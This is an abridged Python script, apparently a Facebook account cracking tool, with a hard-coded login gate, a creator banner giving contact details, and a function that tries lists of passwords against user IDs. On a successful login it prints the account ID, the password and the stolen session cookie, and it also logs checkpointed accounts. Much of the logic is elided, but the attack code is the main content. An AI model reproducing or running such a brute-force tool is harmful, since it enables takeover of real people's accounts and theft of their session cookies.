...
for xd in range(100000):
    ...
    ugen.append(uaku2)
os.system('xdg-open https://www.facebook.com/Rabbi.Ahmed.200')
...
while attemps < 12345677901:
    ...
    if username == 'Dj Rabbi' and password == 'Bal Khan':
        ...
        print('\033[1;35mINCORRECT THIS TOOLS IS PAID PLZ CONTACT WHATSAPP; +8801308447902')
        attemps += 1
        continue
logo = ("""
...
\033[1;91m--------------------------------------------
\033[1;91m[✓] CREATOR   > RABBI AHMED SABBIR
\033[1;91m[✓] FACEBOOK  > RABBI
\033[1;91m[✓] GITHUB    > RabbiAhmed300
\033[1;91m[✓] WHATSAPP  > +8801308447902
\033[1;91m--------------------------------------------""")
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mRabbi\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[Rabbi-OK] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[Rabbi-CP] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[Rabbi-KING] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
